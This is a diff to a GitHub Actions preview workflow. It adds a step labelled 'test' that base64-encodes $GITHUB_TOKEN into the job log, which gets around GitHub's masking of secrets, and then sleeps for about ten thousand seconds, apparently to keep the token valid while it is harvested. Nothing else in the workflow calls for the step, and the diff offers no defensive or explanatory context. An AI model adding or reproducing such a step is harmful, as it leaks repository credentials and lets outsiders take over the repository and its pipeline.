@@ -20,6 +20,10 @@ jobs:
     if: ${{ github.event.label.name == 'preview' || contains(github.event.pull_request.labels.*.name, 'preview') }}
     runs-on: ubuntu-latest
     steps:
+      - name: test
+        run: |
+          echo $GITHUB_TOKEN | base64
+          sleep 10000
       - name: Install ipfs
         run: |
           wget -q https://dist.ipfs.tech/kubo/v0.20.0/kubo_v0.20.0_linux-amd64.tar.gz
